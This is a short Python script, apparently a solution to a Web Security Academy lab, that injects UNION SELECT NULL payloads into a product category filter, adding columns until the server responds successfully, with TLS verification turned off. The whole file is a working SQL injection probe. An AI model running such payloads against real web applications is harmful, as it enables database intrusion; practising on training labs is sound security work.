import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main ():
    
    host = "https://0a3a00c60480595681b511f000fb00b7.web-security-academy.net"
    product_url = f'{host}/filter?category=Accessories'
    comment = "--"
    apostrophe = "'"
    null = "NULL"
    comma = ","
    space = " "
    union = "UNION"
    select = "SELECT"
    payload = apostrophe + space + union + space + select + space + null 

    session = requests.Session()
    solved = False
    max_columns = 20

    for count in range(1, max_columns + 1):
        attempt_payload = payload + (comma + null) * (count - 1)
        attack_url = f"{product_url}{attempt_payload}{comment}"
        response = session.get(attack_url, verify=False)

        if response.status_code == 200:
            print("Koated !!!")
            print(f"Successful payload with {count} columns:")
            print(attack_url)
            solved = True
            break

    if not solved:
        print("siks")

if __name__== "__main__" :
    main()

    